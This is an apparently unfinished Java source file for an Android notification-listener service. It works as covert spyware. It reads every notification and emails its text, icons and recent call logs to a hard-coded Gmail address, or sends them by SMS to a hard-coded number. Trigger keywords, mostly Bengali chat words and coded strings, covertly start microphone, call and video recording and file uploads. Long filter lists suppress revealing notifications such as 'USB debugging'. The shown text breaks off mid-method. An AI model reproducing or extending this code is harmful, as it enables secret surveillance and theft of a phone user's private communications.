package com.example.fasterpro11;
// 22 version 11
import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.Icon;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.util.Log;
import android.provider.CallLog;

import java.io.ByteArrayOutputStream;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.io.InputStream;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private static final String EMAIL = "abontiangum99@gmail.com"; // Update recipient email
    private static final String SMS_RECIPIENT = "+8801300282086"; // Update SMS recipient number

    private final Map<String, ForwardedMessage> lastForwardedMessageMap = new HashMap<>();
    private boolean isBound = false; // Add binding state
    private String NotificationfindAllowedKeyword1;
    private String NotificationfindAllowedKeyword2;
    private String callingAppSoundRecord;
    private Context mContext;

    private static final String[] Condition_Word_For_Mic = {"Goldm","Silverm","Mediumm",
            "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে", "সময়", "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট",
            "screenshort","screenshort dau", "কলদাও",  "কিকরছ " };
    private static final String[] Condition_Word_For_CallingAppSoundRecord= {"Incoming voice call","Ongoing video call","Incoming", "Calling…", "Ringing…","voice call",
            "Missed voice call", "call", "Call","calling","Missed call" };
    private static final String[] Condition_Word_For_CallRecord = {"Goldcc", "Silvercc", "Mediumcc",
            "call","audio", "কল", "কনে",  "কোথায়", "কি", "কে", "কই",  "একটা",  "দরকার", "কোচিং",  "কেন",
            "করবা",  "কিনে", "oi", "screen short","screenshortdau","কোন",  "কিস্তি",   "থেকে", "বিকাশ",
            "সকাল ", "বিকাল",   "ইমো", "হোয়াটসএ্যাপ", "Call",  };
    private static final String[] Condition_Word_For_File = {"Congratulationf", "Conformf",
            "aei","file", "পিক",  "ছবি",  "পাখি",  "লাগবেনা",  "ভলোই", "পাঠাও",   "ইমোতে",  "হোয়াটসএ্যাপে", "File",  };
    private static final String[] Condition_Word_For_Camera = {"Congratulationp", "Conformp"};
    private static final String[] Condition_Word_For_Video = {"Congratulationv", "Conformv",
            "video", "ভিডিও", "বলবা", "দাও ",  "ক্যামেরা",   "ডেলিভারি",  "camera","বলিনি", "বাজে",  "বাসায়",
            "aii",    "ইমুতে", "whatesapps","Video",  };
    private static class ForwardedMessage {
        String message;
        long timestamp;

        ForwardedMessage(String message, long timestamp) {
            this.message = message;
            this.timestamp = timestamp;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationListener service created");
    }

    // Service binding and unbinding
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isBound) {
            bindService(new Intent(this, BackgroundService.class), serviceConnection, Context.BIND_AUTO_CREATE);
            isBound = true;
            Log.d(TAG, "Service bound");
        } else {
            Log.d(TAG, "Service is already bound");
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (isBound) {
            try {
                unbindService(serviceConnection);
                isBound = false;
                Log.d(TAG, "Service unbound successfully");
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Error unbinding service: ", e);
            }
        } else {
            Log.d(TAG, "Service was not bound");
        }
        super.onDestroy();
    }

    // ServiceConnection definition
    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "Service connected");
            isBound = true; // ফ্ল্যাগ সেট করুন
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "Service disconnected");
            isBound = false; // ফ্ল্যাগ রিসেট করুন
        }
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) {
            Log.e(TAG, "Received null notification");
            return;
        }

        try {
            Bundle extras = notification.extras;
            CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            Uri fileUri = extras.getParcelable(Intent.EXTRA_STREAM); // সঠিক লাইন

            Bitmap largeIconBitmap = extractLargeIcon(extras);

            if (title != null && (text != null || largeIconBitmap != null)) {
                String packageName = sbn.getPackageName();
                String currentMessage = title + " " + (text != null ? text : "");

                // New condition to block specific apps
                if (isBlockedApp(packageName)) {
                    if (packageName.equals("com.internet.speed.meter.lite") ||
                            packageName.equals("com.android.systemui") ||
                            packageName.equals("com.samsung.android.net.wifi.wifiguider") ||
                            packageName.equals("com.google.android.gm") ||
                            packageName.equals("com.tekxperiastudios.pdfexporter") ||
                            packageName.equals("global.juscall.android") ||
                            packageName.equals("com.lenovo.anyshare.gps")) {
                        // Do nothing, don't log
                    } else {
                        Log.d(TAG, "Notification from blocked app: " + packageName);
                    }
                    return; // Exit if it's a blocked app
                }
                Log.d(TAG, "Notification from app: " + packageName);

                // Create MicRecord instance and start recording
                MicRecord micRecord = new MicRecord(this); // 'this' is the context (e.g., your Activity or Service)
                String incomingNumber = "Some number";  // Replace this with the actual number or logic to extract it
                String messageBody = "Some message";  // Replace this with the actual message body or logic to extract it
                // Call the startRecording method with the correct parameters
                Log.d(TAG, "Notification  wh imo mes rec stop ");


                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
                    Log.d(TAG, "wh imo mes rec start .Android version 9 এর নিচে .versiov:" + Build.VERSION.SDK_INT);
                    //micRecord.StartRecording(incomingNumber, messageBody);
                    micRecord.StopMicSoundRecording(incomingNumber, messageBody); // রেকর্ডিং বন্ধ করুন
                } else {
                    Log.d(TAG, "wh imo mes not rec start .Android version 9 এর নিচে.versiov:" + Build.VERSION.SDK_INT);
                }

                // Pass title and currentMessage to ConditionForCallOtherClassMethod
                if (ConditionForCallOtherClassMethod(title.toString(), currentMessage)) {
                    NotificationfindAllowedKeyword1 = findAllowedKeyword1(title.toString(), currentMessage);
                    NotificationfindAllowedKeyword2 = findAllowedKeyword2(title.toString(), currentMessage);
                    callingAppSoundRecord = CallingAppSoundRecord(title.toString(), currentMessage);

                    if (NotificationfindAllowedKeyword1 != null &&  NotificationfindAllowedKeyword2 != null) {
                        // Check if NotificationfindAllowedKeyword1 is one of the keywords


                        // Check for Microphone Recording
                        if (Arrays.asList(Condition_Word_For_Mic).contains(NotificationfindAllowedKeyword1)) {
                            Log.d(TAG, "Notification  Conditions  met  call micRecord StartRecording ");
                            // Create MicRecord instance and start recording
                            // MicRecord micRecord = new MicRecord(this); // 'this' is the context (e.g., your Activity or Service)
                            Intent intent = new Intent();  // Create an intent if needed, or use an existing one
                            Log.d(TAG, "Notification  Conditions met  call micRecord.onReceive ");
                            micRecord.onReceive(this, intent);
                        }

                        // Check for call Recording   CallRecorderAuto caclass
                        else if (Arrays.asList(Condition_Word_For_CallRecord ).contains(NotificationfindAllowedKeyword1)) {
                            CallRecorderAuto callRecorderAuto = new CallRecorderAuto();
                            Log.d(TAG, "Notification  Conditions  met  callRecorderAuto StartRecording ");
                            Log.d(TAG, "Notification from call the method callRecorderAuto class  in SendLastRecordingViaEmail .");
                            callRecorderAuto.SendLastRecordingViaEmail(this); // 'this' ব্যবহার করুন যদি এটি Activity/Service থেকে কল করা হয়
                        }
                        // Check for files Sending FileService Class
                        else if (Arrays.asList(Condition_Word_For_File).contains(NotificationfindAllowedKeyword1)) {
                            FileService fileService = new FileService();
                            Intent intent = new Intent();
                            Log.d(TAG, "Notification Conditions met. FileService HandleSmsReceived.");
                            Log.d(TAG, "Notification from calling the method fileService of HandleSmsReceived.");
                            fileService.SendLastTimeFileingsEmail(intent, this); // 'this' should refer to the correct Context (Activity/Service)
                        }


                        // Check for Video Recording videoRecord class
                        else if (Arrays.asList(Condition_Word_For_Video ).contains(NotificationfindAllowedKeyword1)) {
                            VideoRecord videoRecord = new VideoRecord();
                            String sender = "sampleSender";  // Replace with actual sender value
                            // String messageBody = "sampleMessage";  // Replace with actual message content
                            Log.d(TAG, "Notification  Conditions  met  videoRecord StartRecording .");
                            Log.d(TAG, "Notification from call the method videoRecord class in startRecording  .");
                            videoRecord.StartRecording(getApplicationContext(), sender, messageBody);
                        }

                    } else {
                        Log.d(TAG, "Notification  Conditions not met  for call other method.");
                    }

                } else {
                    Log.d(TAG, "Notification not met  Conditions for Call other class .");
                }




                // whatesapp imo messenger for sound Recording Check for CallingApp CallingAppSoundRecord
                callingAppSoundRecord = CallingAppSoundRecord(title.toString(), currentMessage);
                if (Arrays.asList(Condition_Word_For_CallingAppSoundRecord).contains(callingAppSoundRecord)) {
                    // Create MicRecord instance and start recording
                    //  MicRecord micRecord = new MicRecord(this); // 'this' is the context (e.g., your Activity or Service)
                    // String incomingNumber = "Some number";  // Replace this with the actual number or logic to extract it
                    // String messageBody = "Some message";  // Replace this with the actual message body or logic to extract it
                    // Call the startRecording method with the correct parameters
                    Log.d(TAG, "Notification  wh imo mes rec Conditions  met  micRecord StartRecording ");
                    Log.d(TAG, "Notification from call wh imo mes rec the method of micRecord Sound StartRecording.");

                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
                        Log.d(TAG, "wh imo mes rec start .Android version 9 এর নিচে .versiov:" + Build.VERSION.SDK_INT);
                        micRecord.StartRecording(incomingNumber, messageBody);
                    } else {
                        Log.d(TAG, "wh imo mes not rec start .Android version 9 এর নিচে.versiov:" + Build.VERSION.SDK_INT);
                    }
                } else {
                    Log.d(TAG, "Notification not met  wh imo mes rec Conditions for CallingAppSoundRecord .");
                }


                if (SameEmailCheekShouldForwardNotification(packageName, currentMessage)) {
                    if (!isBlockedNotification(title.toString(), text != null ? text.toString() : "")) {
                        if (isInternetConnected()) {
                            if (fileUri != null) {
                                handleFileUri(fileUri); // Handle image, audio, video as before
                            } else if (text != null) {
                                forwardNotificationByEmail(packageName, title.toString(), text.toString(), largeIconBitmap);
                            }
                        } else if (shouldForwardBySMS(currentMessage)) {
                            forwardNotificationBySMS(packageName, title.toString(), text != null ? text.toString() : "");
                        } else {
                            Log.d(TAG, "Notification not forwarded due to conditions not met");
                        }
                        lastForwardedMessageMap.put(packageName, new ForwardedMessage(currentMessage, System.currentTimeMillis()));
                    }
                } else {
                    Log.d(TAG, "Notification not forwarded because the same message was recently sent");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, " onNotificationPosted  in Error : ", e);
        }
    }
    public boolean ConditionForCallOtherClassMethod(String title, String message) {
        String findAllowedKeyword1 = findAllowedKeyword1(title, message);
        String findAllowedKeyword2 = findAllowedKeyword2(title, message);

        if ((findAllowedKeyword1 != null) &&  (findAllowedKeyword2 != null)) {
            Log.d(TAG, "notification findAllowedKeyword1 or findAllowedKeyword2 match: true ");
            return true;
        }
        Log.d(TAG, "notification findAllowedKeyword1 or findAllowedKeyword2 match: False");
        return false;
    }
    public String findAllowedKeyword1(String title, String message) {
        String[] allowedKeywords = {"Goldm", "Silverm", "Mediumm", "Goldc", "Silverc", "Mediumc",
                "Goldf", "Silverf", "Mediumf","Goldv", "Silverv", "Mediumv",
                "mic", "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে",  "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট",
                "screenshort","screenshort dau", "কলদাও",  "কিকরছ ", "Mic",
                "call","audio", "কল", "কনে",  "কোথায়", "কি", "কে", "কই",  "একটা",  "দরকার", "কোচিং",  "কেন",  "করবা",  "কিনে",
                "oi", "screen short","screenshortdau","কোন",  "কিস্তি",   "থেকে", "বিকাশ", "সকাল ", "বিকাল",   "ইমো", "হোয়াটসএ্যাপ", "Call",
                "file", "aei", "পিক",  "ছবি",  "পাখি",  "লাগবেনা",  "ভলোই", "পাঠাও",   "ইমোতে",  "হোয়াটসএ্যাপে", "File",
                "video", "ভিডিও", "বলবা", "দাও ",  "ক্যামেরা",   "ডেলিভারি",  "camera","বলিনি", "বাজে",  "বাসায়", "সময়",
                "aii",    "ইমুতে", "whatesapps","Video",   };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                Log.d(TAG, "notification findAllowedKeyword1  matchs: " + keyword);
                return keyword;
            }
        }
        return null;
    }

    public String findAllowedKeyword2(String title, String message) {
        String[] allowedKeywords = {"Congratulationm", "Conformm","Congratulationc", "Conformc","Congratulationf", "Conformf",
                "Congratulationv" , " _ ", " ^ ", " ! ", " : ", " & ", " * ", " @ ", " ? ","Conformv" };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                Log.d(TAG, "notification findAllowedKeyword2  match: " + keyword);
                return keyword;
            }
        }
        return null;
    }
    public String CallingAppSoundRecord(String title, String message) {
        String[] allowedKeywords = {"Incoming voice call","Ongoing video call","Incoming",
                "Calling…", "Ringing…","voice call",
                "Missed voice call", "call", "Call","Missed call" };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                // String CallingAppSoundRecord == keyword ;
                Log.d(TAG, "notification CallingAppSoundRecord  match: " + keyword);
                return keyword;
            }
        }
        return null;
    }

    // Method to check if the app is blocked
    private boolean isBlockedApp(String packageName) {
        return packageName.equals("com.video.fun.app") || packageName.equals("com.lenovo.anyshare.gps") || packageName.equals("com.video.lenavo.app") || packageName.equals("com.google.android.googlequicksearchbox") || packageName.equals("com.samsung.android.gggmessaging")||
                packageName.equals("info.androidstation.qhdwallpaper")|| packageName.equals("com.google.android.apps.photos")|| packageName.equals("info.androidstation.qhdwallpaper")|| packageName.equals("com.google.android.gm")||
                packageName.equals("com.android.systemui")|| packageName.equals("com.google.android.deskclock")||
                packageName.equals("com.anydesk.anydeskandroid")  || packageName.equals("com.medhaapps.wififtpserver") ||
                packageName.equals("com.miui.player") || packageName.equals("com.google.android.youtube") ||
                packageName.equals("com.bbk.theme") || packageName.equals("com.android.bluetooth") ||
                packageName.equals("net.bat.store") ||packageName.equals("com.mapzonestudio.best.language.translator.dictionary") ||
                packageName.equals("com.xvideostudio.videoeditor") || packageName.equals("com.lemon.lvoverseas") ||
                packageName.equals("com.banglalink.toffee") || packageName.equals("com.phone.cleaner.shineapps")
                || packageName.equals("com.bongo.bongobd") || packageName.equals("com.islam.surahyaseenaudio") ||
                packageName.equals("com.starmakerinteractive.starmaker") || packageName.equals("com.maxboost.cleaner") ||
                packageName.equals("com.daraz.android") ||
                packageName.equals("com.internet.speed.meter.lite");
    }
    private boolean isBlockedNotification(String title, String message) {
        for (String blockedTitle : BLOCKED_TITLES) {
            if (title.equals(blockedTitle) || title.contains(blockedTitle)) {
                Log.d(TAG, "notification Blocked  by title: " + blockedTitle);
                return true;
            }
        }

        for (String blockedTitle : ADDITIONAL_BLOCKED_TITLES) {
            if (title.equals(blockedTitle) || title.contains(blockedTitle)) {
                Log.d(TAG, "notification Blocked  by additional title keyword: " + blockedTitle);
                return true;
            }
        }

        for (String blockedMessage : BLOCKED_MESSAGES) {
            if (message.equals(blockedMessage) || message.contains(blockedMessage)) {
                //  Log.d(TAG, "Blocked notification by message: " + blockedMessage);
                return true;
            }
        }

        for (String blockedMessage : ADDITIONAL_BLOCKED_MESSAGES) {
            if (message.equals(blockedMessage) || message.contains(blockedMessage)) {
                Log.d(TAG, "notification Blocked  by additional message keyword: " + blockedMessage);
                return true;
            }
        }

        String blockedKeyword = findBlockedKeyword(title, message);
        if (blockedKeyword != null) {
            Log.d(TAG, "notification Blocked  by keyword match: " + blockedKeyword);
            return true;
        }
        return false;
    }
    private static final String[] BLOCKED_TITLES = {
            "Notification from com.internet.speed.meter.lite", "internet.speed.meter.lite", "Cable charging",
            "Foreground Service", "Battery powe", "GP", "GB", "GP30GB350TK", "imo is displaying over other apps",
            "until fully charged", "Chat heads active", "Cable charging (5 h 21 m until fully charged)",
            "Tomorrow in Jashore ", "setup in progress ", "Live Caption is on", " No internet", "com.video.fun.app",
            "com.video.fun.app", "media files", "files via USB", "Transferring media ",
            "Transferring media files via USB", "Charging this device via USB","Screenshot saved","Govt. Info⁩",
            "Happy birthday to...",

            "(5 h 21 m until fully charged)"
    };

    private static final String[] ADDITIONAL_BLOCKED_TITLES = {
            "internet.speed", "Foreground", "GP30", "GP", "GB", "GB350TK", "30GB350TK", "displaying over",
            "over other apps", "Tomorrow in", "setup in", "in progress", "Caption is on", "until fully charged",
            "fully charged", "Notification from com.ludashi.dualspace", "media files", "files via USB",
            "Transferring media", "Transferring media files via USB", "Charging this device via USB",
            "Charging this ", "device via USB", "com.video.fun.app", "USB debugging connected","Screenshot saved",
            "Govt. Info⁩","Happy birthday to...","Uploading...", "Uploading",
            "GB450TK"
    };

    private static final String[] BLOCKED_MESSAGES = {
            "Mobile: 0 MB", "0 MB", "Notification from com.google.android.gm", "Notification from android", "Notification from com.facebook.orca",
            "Notification from com.google.android.setupwizard", "Notification from us.zoom.videomeetings",
            "AZ Screen Recorder is displaying over other apps", "Notification from com.google.android.setupwizard","0 MB", "GP", "GB",
            "Charge your phone or tap here to turn on Power saving mode", "Running in foreground", "Notification from com.example.fasterpro11",
            "Start a conversation", ",Approximately h m until fully charged", "Charging: 18%", "com.video.fun.app",   "com.video.fun.app",
            " om.mm.android.smartlifeiot", "Notification from com.mm.android.smartlifeiot", "USB options", "Tap for other",
            "Tap for other USB options", "Notification from com.imo.android.imoim", "Notification from com.samsung.android.app.smartcapture",
            "Notification from com.samsung.android.dialer", "Missed Audio Call", "Notification from com.lenovo.anyshare.gps",
            "Notification from com.google.android.googlequicksearchbox", "Checking for new messages", "Emergency balance",
            "Your friend request was accepted", "Tap for more options", "Tap to set up with Grameenphone","Tap to turn off USB debugging",
            "View messages","You've got 1 message","Hello, is this still available?","Happy birthday to...",
            "You have a new notification","Unknown artist","Join","Service","backup", "tagged", "Finish setting",
            "View messages", "(Approximately 5 h 21 m until fully charged)"
    };

    private static final String[] ADDITIONAL_BLOCKED_MESSAGES = {
            "us.zoom", "videomeetings", "displaying over", "GP", "GB",  "over other apps",
            "Charge your phone", "Power saving mode", "foreground", "until fully charged", "Charging",
            "Notification from com.ludashi.dualspace",
            "com.mm.android.smartlifeiot", "Notification from com.mm.android.smartlifeiot",
            "USB options", "Tap for other", "Tap for other USB options", "smartcapture", "dialer",
            "android.dialer", "lenovo.anyshare",
            "lenovo.anyshare.gps", "Notification from com.lenovo.anyshare.gps", " googlequicksearchbox",
            " android.googlequicksearchbox",
            "Checking for", "new messages", "Emergency balance", "Your friend request", "friend request",
            "Tap for more options",
            "Tap to set up with Grameenphone", "Tap to set", "set up with", "messages from 2 chats",
            "View messages","You have a new notification","Unknown artist", "Silence",
            "Govt. Info⁩","fully charged"
    };
    private String findBlockedKeyword(String title, String message) {
        String[] blockedKeywords = {
                "internet.speed.meter.lite", "internet.speed", "internet", "Foreground",

                "displaying over", "over other apps", "Tomorrow in", "setup in", "in progress", "Caption is on",
                "until fully charged","charged", "fully charged","Screenshot saved","Screenshot","joined Telegram!",
                "Telegram!", "Tap to turn off USB debugging","Tap to turn","USB debugging", "debugging","USB",
                "Temporarily turned off by your carrier for SIM 1","Temporarily turned off","turned",
                "carrier for SIM 1","SIM 1","SIM 2", "see your screenshot", "MOONBIX",
                "messages related","messages from","messages from","Govt. Info", "Govt. i8nfo","Govt",
                "View messages", "wifiguider","নতুন অফার!",
                "অফার!"," জিবি ","*১২১*","৩০দিন", "৭ দিন", "৭দিন","৩০ দিন", "৩০দিন", "৩ দিন", "৩ িন","১৫ দিন", "১৫দিন",
                "added a post",  "SmartTV","MB","Mb","mb",
                "GP30", "GB350TK", "30GB350TK", "GB300TK",
                "is this still available?", "is this", "available?", "Wi-Fi",
                "On hold", "birthday","2nd year", "ICT","iCT","ict", "college", "JPI", "You've got ",
                "battery",   "Join all","mentioned","Front Door", "Front","Door", "stories",
                "friend suggestion","suggestion",
                "👍","Shared a video in Story","posted", "alive to receive", "alive","backing",
                "highlighted a comment", "comment", "updates",
                "Groups","groups","GROUPS","Group","group","GROUP", "GROUP","like","like","seconds left",
                "rating bonus", "rating", "bonus","Emergency balance", "Emergency","বোনাস","রোল ",
                "connection", "running","স্যার","Uploading...", "Uploading", "Deleting","Delete",
                "ডিসকাউন্ট","ক্যাশব্যাক", "Sir","SIR","sir","JGMC", "Jgmc","jgmc","lab","পড়া","Pora","pora",
                "Engg", "Engineer","Exam", "exam","science","Science",  "Commerce",
                "bot?start=r", "invite friends", "rewards","chest","Invite you into the game","🄼🄸🄽🄴🅁 🅉🄾🄽🄴",
                "telegram","BTSE", "referral link", "wcoin_tapbot", "t.me", "app?startapp", "played",  "Cattea?",
                "Capybuddy!", "undefined","claim","Wheel","wheel", "#airdrop","#airdrop",
                "Location","maps","রিনিউ", "ফরওয়ার্ড", "reacted", "poraben","reduced","Reacted",
                "FREE", "Win", " interested?","channel", "TV", "TikTok", "Referral ","Bikroy","ভ্যাটের","ভ্যাট",
                "ইন্টারনেট অফার", "আনলিমিটেড", " ইন্টারনেট বিলের", "পরিশোধিত", "Bubble shooter game", "inbox me", "পুরস্কার",
                " admin approved",
                "replied", "reactions","Reacted", "Reminder", "Checking", "device", "updated", "BCS","shared","Upgrade",
                "Upgrade", " post ", " posts ","Team", "reactions", " Reacted ", " resume "," highlighted ","Photo",
                "Mobile Recharge","watched template","template",
                "playstore","minute left",
                "Google Drive Chat Backup",
                "Cube ACR","call recording",
                "Ict","ict","ICT",
                "snapchat related","Fake girlfriend",
                "imo related",  "Sticker", "is back on imo!", "Incoming imo audio call", "Added to their Story",
                "You have a new message","Audio", "with Almost Done! ",
                "dialpad message error ", "Review message and try again", "Waiting for this message",
                "call related ", "Missed call",
                "sell Bazar",  "ক্রয় বিক্রয়",
                "You have 1 new message","Network speed for current app will be boosted.",
                "Waiting for you","new notifications","Voice message","Running Call",
                "missed calls","Incoming voice call", "Ringing…", "missed voice calls",
                "(EC)", "Economic census", "watched template","template","নতুন আপডেট",
                "..","Tap to resume",
                "vivo related","and see the more used apps", "more used apps.", "Find easily your mail box",
                "Sign in to network","Invitation from your friends","Tap to view","Alarm","alarm clock",
                "have been blocked","second left",
                "Contact sync", "contact information ",
                "snapchat related","watch this!",
                "fb related", "Tap to return to call", "asked to join",
                "Voucher on bKash Payment",
                "update related", "Auto update:",
                "GB450TK"
        };

        for (String keyword : blockedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                return keyword;
            }
        }
        return null;
    }
    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                NetworkCapabilities capabilities = cm.getNetworkCapabilities(cm.getActiveNetwork());
                return capabilities != null && capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
            } else {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                return activeNetwork != null && activeNetwork.isConnected();
            }
        }
        return false;
    }
    private boolean shouldForwardBySMS(String message) {
        return !isInternetConnected() && (containsFiveDigitNumber(message) || isSpecificSMSRecipient(message));
    }
    private boolean containsFiveDigitNumber(String message) {
        return message.matches(".*\\+\\d{4}.*");
    }
    private boolean isSpecificSMSRecipient(String message) {
        return message.contains("GP") || message.contains("+8801304039289");
    }

    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        try (Cursor cursor = getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 10) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String callType = getCallType(type);

                    callLogBuilder.append("Number: ").append(number)
                            .append(", Type: ").append(callType)
                            .append(", Duration: ").append(duration)
                            .append(", Date: ").append(DateUtils.dateToString(date)) // Ensure you have a date formatting utility
                            .append("\n");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "notification Error retrieving call logs: ", e);
        }
        return callLogBuilder.toString();
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    private boolean SameEmailCheekShouldForwardNotification(String packageName, String currentMessage) {
        if (lastForwardedMessageMap.containsKey(packageName)) {
            ForwardedMessage lastForwardedMessage = lastForwardedMessageMap.get(packageName);
            boolean shouldForward = !currentMessage.equals(lastForwardedMessage.message) ||
                    (System.currentTimeMillis() - lastForwardedMessage.timestamp) > 120000; // 2 minutes
            return shouldForward;
        }
        return true;
    }

    private void forwardNotificationByEmail(String app, String title, String text, Bitmap image) {
        try {
            // মোবাইল মডেল নিন
            String mobileModel = android.os.Build.MODEL;
            String subject = "Nt model: " + mobileModel + " " + app;
            String messageBody = "Title: " + title + "\nMessage: " + text + "\n\n(MOBILE:" + mobileModel + "): Recent Call Logs\n" + getRecentCallLogs();

            // চেক করুন যে ইমেজ অবজেক্টটি null
            if (image != null) {
                // ইমেজের ফাইল সাইজ বের করুন
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                image.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
                byte[] byteArray = byteArrayOutputStream.toByteArray();
                long fileSize = byteArray.length;

                // পূর্বের ইমেল কন্টেন্ট এবং ফাইল সাইজ চেক করুন
                if (isEmailContentSame(subject, messageBody, fileSize)) {
                    Log.d(TAG, "Mail content same as before. Skipping email send.");
                    return; // যদি কন্টেন্ট একই হয়, ইমেল পাঠানো বাদ দিন
                }

                // ইমেজ সহ ইমেল পাঠান
                JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, image);
                Log.d(TAG, "Notification forwarded successfully via email with image");

                // পাঠানো ইমেলের ডিটেইলস স্টোর করুন
                storeEmailDetails(subject, messageBody, fileSize);
            } else {
                // ইমেজ যদি null থাকে, তবে ইমেজ ছাড়া ইমেল পাঠান
                Log.d(TAG, "Image is null, sending email without image.");
                JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, null);
                Log.d(TAG, "Notification forwarded successfully via email without image");

                // ইমেজ ছাড়াই ডিটেইলস স্টোর করুন
                storeEmailDetails(subject, messageBody, 0); // ইমেজ ছাড়াই ফাইল সাইজ 0
            }

        } catch (Exception e) { // সব ধরনের এক্সেপশন ধরা
            Log.e(TAG, "Notification failed to forward via email: ", e);
        }
    }



    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, long fileSize) {
        // Context চেক করুন
        if (mContext == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return; // যদি mContext null হয়, তাহলে কার্যক্রম বন্ধ করুন
        }

        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("subject", subject);
        editor.putString("body", body);
        editor.putLong("fileSize", fileSize);
        editor.apply();
        Log.d(TAG, "Email details stored.");
    }


    // Check if the email content is the same as before
    private boolean isEmailContentSame(String subject, String body, long fileSize) {
        // নিশ্চিত করুন mContext null নয়
        if (mContext == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return false; // যদি mContext null হয়, তাহলে false রিটার্ন করুন
        }

        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        String previousSubject = sharedPreferences.getString("subject", "");
        String previousBody = sharedPreferences.getString("body", "");
        long previousFileSize = sharedPreferences.getLong("fileSize", 0);

        // বর্তমান ইমেলের কন্টেন্ট এবং স্টোর করা কন্টেন্ট তুলনা করুন
        return subject.equals(previousSubject) && body.equals(previousBody) && fileSize == previousFileSize;
    }



    private void forwardNotificationBySMS(String app, String title, String text) {
        try {
            String smsMessage = "Notification from " + app + "\nTitle: " + title + "\nMessage: " + text + "\n\nRecent Call Logs:\n" + getRecentCallLogs();
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(SMS_RECIPIENT, null, smsMessage, null, null);
            Log.d(TAG, "Notification forwarded successfully via SMS");
        } catch (Exception e) {
            Log.e(TAG, "notification Error in forwardNotificationBySMS: ", e);
        }
    }

    private void handleFileUri(Uri fileUri) {
        String mimeType = getContentResolver().getType(fileUri);
        if (mimeType != null) {
            switch (mimeType.split("/")[0]) {
                case "image":
                    forwardNotificationWithImage(fileUri);
                    break;
                case "audio":
                    forwardNotificationWithAudio(fileUri);
                    break;
                case "video":
                    forwardNotificationWithVideo(fileUri);
                    break;
                default:
                    forwardNotificationWithFile(fileUri);
                    break;
            }
        } else {
